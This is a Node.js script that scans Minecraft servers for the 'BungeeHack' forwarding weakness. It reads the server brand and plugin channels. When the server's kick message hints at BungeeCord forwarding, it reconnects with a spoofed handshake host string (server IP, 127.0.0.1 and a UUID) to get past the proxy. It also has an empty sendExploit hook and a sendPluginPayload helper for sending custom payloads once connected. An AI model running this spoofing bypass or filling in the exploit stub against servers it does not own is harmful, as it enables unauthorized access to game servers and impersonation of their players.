/*
    Extracts text from JSON string
*/
function getTextFromJSON(json) {
  let obj;

  try {
    obj = JSON.parse(json);
  } catch (_) {
    return json;
  }

  let text = "";

  function extractText(element) {
    if (!element) return;

    if (typeof element === "string") {
      text += element;
      return;
    }

    if (element.text) {
      text += element.text;
    }

    if (element.translate) {
      text += element.translate;
    }

    if (Array.isArray(element.extra)) {
      element.extra.forEach(extractText);
    }

    if (Array.isArray(element.with)) {
      element.with.forEach(extractText);
    }
  }

  extractText(obj);

  return text.trim() || json;
}

class MinecraftBot {
    constructor({ ip, port, mode = 'none', username = 'Scanner', version = false }) {
        this.ip = ip;
        this.port = port;
        this.version = version;
        this.username = username;
        this.brand = '';
        this.channels = [];
        this.ready = false;
        this.gotBrand = false;
        this.gotChannels = false;
        this.mode = mode;
        this.hasRetried = false;
        this.timeout = null;
        this.readyTimeout = null;
        this.exploitSent = false;
        this.isBungeeHackVuln = false;

        this._initClient();
    }

    _initClient() {
        const mp = require('minecraft-protocol');

        const options = {
            host: this.ip,
            port: this.port,
            version: this.version,
            username: this.username,
        };

        if (this.mode === 'fakehost') {
            const fakeHost = `${this.ip}\x00127.0.0.1\x00e9e21092-7627-4ff0-9f11-b9898d0beb42`;
            options.username = 'Scanner';
            options.fakeHost = fakeHost;
        }

        try {
            this.bot = mp.createClient(options);

            this.timeout = setTimeout(() => {
                this.finalize();
            }, 15000);

            this.bot.on('connect', () => this.onConnect());
            this.bot.on('error', (err) => this.onError(err));
            this.bot.on('kick_disconnect', (reason) => this.onKickDisconnect(reason));
            this.bot.on('disconnect', (reason) => this.onKickDisconnect(reason));
            this.bot.on('login', () => this.onLogin());
            this.bot.on('plugin_message', (data) => this.onPluginMessage(data));
            this.bot.on('custom_payload', (packet) => this.onCustomPayload(packet));
            this.bot.on('end', () => this.onDisconnected());
        } catch (err) {
            console.log(`[ERROR] Failed to connect: ${err.message}`);
            this.finalize();
        }
    }

    onConnect() {
        console.log(`[INFO] Connecting to ${this.ip}:${this.port}...`);
    }

    onError(err) {
        if (!this.hasRetried && this.mode === 'none' && 
            (err.message.includes('ECONNREFUSED') || err.message.includes('timeout'))) {
            this.retryWithFakehost();
        } else {
            this.finalize();
        }
    }

    onKickDisconnect(reason) {
        let reasonText = '';
        
        try {
            if (typeof reason === 'string') {
                reasonText = reason;
            } else if (reason && typeof reason === 'object') {
                if (reason.reason) {
                    reasonText = typeof reason.reason === 'string' ? reason.reason : getTextFromJSON(reason.reason);
                } else if (reason.text) {
                    reasonText = getTextFromJSON(reason);
                } else {
                    reasonText = JSON.stringify(reason);
                }
            } else {
                reasonText = String(reason);
            }
        } catch (err) {
            reasonText = 'Unable to parse kick reason';
        }
        
        if (reasonText && typeof reasonText === 'string' && 
            (reasonText.includes('forwarding') || reasonText.includes('BungeeCord') || 
             reasonText.includes('enable it in your BungeeCord settings'))) {
            this.isBungeeHackVuln = true;
            
            if (!this.hasRetried && this.mode === 'none') {
                this.retryWithFakehost();
                return;
            }
        }
        
        this.finalize();
    }

    onLogin() {
        this.requestBrand();
        
        this.readyTimeout = setTimeout(() => {
            this.finalize();
        }, 8000);
    }

    requestBrand() {
        try {
            this.bot.write('plugin_message', {
                channel: 'minecraft:brand',
                data: Buffer.from('minecraft:brand')
            });
            
            this.bot.write('plugin_message', {
                channel: 'MC|Brand',
                data: Buffer.from('MC|Brand')
            });
        } catch (err) {
            // fail
        }
    }

    onPluginMessage(data) {
        if (data.channel === 'minecraft:brand' || data.channel === 'MC|Brand') {
            let brandData = data.data;
            if (data.channel === 'minecraft:brand' && brandData.length > 2) {
                const length = brandData.readUInt16BE(0);
                brandData = brandData.slice(2, 2 + length);
            }
            this.brand = brandData.toString('utf8');
            this.gotBrand = true;
        }

        if (data.channel === 'minecraft:register' || data.channel === 'REGISTER') {
            const newChannels = data.data.toString('utf8').split('\x00').filter(Boolean);
            this.channels = [...new Set([...this.channels, ...newChannels])];
            this.gotChannels = true;
        }

        this.checkReady();
    }

    onCustomPayload(packet) {
        if (packet.channel === 'minecraft:brand' || packet.channel === 'MC|Brand') {
            let brandData = packet.data;
            
            if (packet.channel === 'minecraft:brand' && brandData.length > 0) {
                let offset = 0;
                if (brandData[0] < 128) {
                    const length = brandData[0];
                    brandData = brandData.slice(1, 1 + length);
                } else {
                    brandData = brandData.slice(1);
                }
            }
            
            this.brand = brandData.toString('utf8');
            this.gotBrand = true;
        }

        if (packet.channel === 'minecraft:register' || packet.channel === 'REGISTER') {
            const channelData = packet.data.toString('utf8');
            let newChannels = channelData.split('\x00').filter(Boolean);
            if (newChannels.length === 1 && newChannels[0].includes('\n')) {
                newChannels = newChannels[0].split('\n').filter(Boolean);
            }
            
            this.channels = [...new Set([...this.channels, ...newChannels])];
            this.gotChannels = true;
        }

        if (!['minecraft:brand', 'MC|Brand', 'minecraft:register', 'REGISTER'].includes(packet.channel)) {
            if (!this.channels.includes(packet.channel)) {
                this.channels.push(packet.channel);
                this.gotChannels = true;
            }
        }

        this.checkReady();
    }

    checkReady() {
        if (this.readyTimeout) {
            clearTimeout(this.readyTimeout);
            this.readyTimeout = setTimeout(() => {
                this.finalize();
            }, 5000);
        }

        if ((this.gotBrand || this.gotChannels) && !this.ready) {
            setTimeout(() => {
                if (!this.ready) {
                    this.onReady();
                }
            }, 2000);
        }
    }

    onReady() {
        if (this.ready) return;
        this.ready = true;

        // Detect BungeeHack
        const hasBungeeChannel = this.channels.includes('bungeecord:main');
        const isBungeeCord = this.brand && this.brand.toLowerCase().includes('bungeecord');
        const bungeeHackStatus = (isBungeeCord && hasBungeeChannel) || this.isBungeeHackVuln;

        console.log('\n=== SCAN RESULTS ===');
        console.log(`Server: ${this.ip}:${this.port}`);
        console.log(`Brand: ${this.brand || 'Unknown'}`);
        console.log(`Channels (${this.channels.length}): ${this.channels.join(', ') || 'None'}`);
        console.log(`BungeeHack: ${bungeeHackStatus ? 'VULNERABLE' : 'Not detected'}`);
        console.log(`Mode: ${this.mode.toUpperCase()}`);

        this.attemptExploits();

        const result = {
            ip: this.ip,
            port: this.port,
            brand: this.brand || null,
            channels: this.channels,
            channelCount: this.channels.length,
            bungeeHackVulnerable: bungeeHackStatus,
            mode: this.mode
        };

        console.log('\nJSON Result:');
        console.log(JSON.stringify(result, null, 2));
        console.log('===================\n');

        setTimeout(() => {
            this.finalize();
        }, 1000);
    }

    attemptExploits() {
        if (this.exploitSent) return;
        this.exploitSent = true;

        this.sendExploit();
    }

    sendExploit() {
        // Exploit code
        // Use this.sendPluginPayload(channel, payload) to send custom payloads
    }

    retryWithFakehost() {
        if (this.hasRetried) return;
        
        this.hasRetried = true;
        console.log('[INFO] Retrying with fakehost mode...');
        
        if (this.timeout) clearTimeout(this.timeout);
        if (this.readyTimeout) clearTimeout(this.readyTimeout);
        
        if (this.bot) this.bot.end();
        
        setTimeout(() => {
            new MinecraftBot({
                ip: this.ip,
                port: this.port,
                username: 'Scanner',
                mode: 'fakehost',
                version: this.version
            });
        }, 1000);
    }

    finalize() {
        if (this.ready && this.exploitSent) return;
        
        if (this.timeout) clearTimeout(this.timeout);
        if (this.readyTimeout) clearTimeout(this.readyTimeout);
        
        if (this.gotBrand || this.gotChannels) {
            this.onReady();
        } else {
            console.log(`[FAIL] No data collected from ${this.ip}:${this.port}`);
            
            if (this.bot) {
                this.bot.end();
            }
            
            this.onDisconnected();
        }
    }

    onDisconnected() {
        if (!this.hasRetried && this.mode === 'none' && !this.ready) {
            this.retryWithFakehost();
        } else {
            console.log('[INFO] Scan completed.');
            setTimeout(() => {
                process.exit(0);
            }, 500);
        }
    }

    sendPluginPayload(channel, payloadJson) {
        try {
            const buffer = Buffer.from(JSON.stringify(payloadJson), 'utf8');
            this.bot.write('plugin_message', {
                channel: channel,
                data: buffer
            });
            console.log(`[EXPLOIT] Payload sent to ${channel}`);
        } catch (err) {
            console.log(`[ERROR] Failed to send payload to ${channel}: ${err.message}`);
        }
    }
}

// --- ENTRY POINT ---
const ip = process.argv[2];
const portStr = process.argv[3];
const port = parseInt(portStr);
const mode = process.argv[4] === 'fakehost' ? 'fakehost' : 'none';
const version = process.argv[5] || false;

if (!ip || isNaN(port) || port < 1 || port > 65535) {
    console.log('Usage: node scanner.js <ip> <port> [mode] [version]');
    console.log('Example: node scanner.js 127.0.0.1 25565');
    console.log('Example: node scanner.js 127.0.0.1 25565 fakehost');
    console.log('Example: node scanner.js 127.0.0.1 25565 none 1.21.4');
    process.exit(1);
}

try {
    const bot = new MinecraftBot({
        ip,
        port,
        username: mode === 'fakehost' ? 'Scanner' : 'Scanner',
        mode,
        version
    });
} catch (err) {
    console.log(`[ERROR] Startup failed: ${err.message}`);
    process.exit(1);
}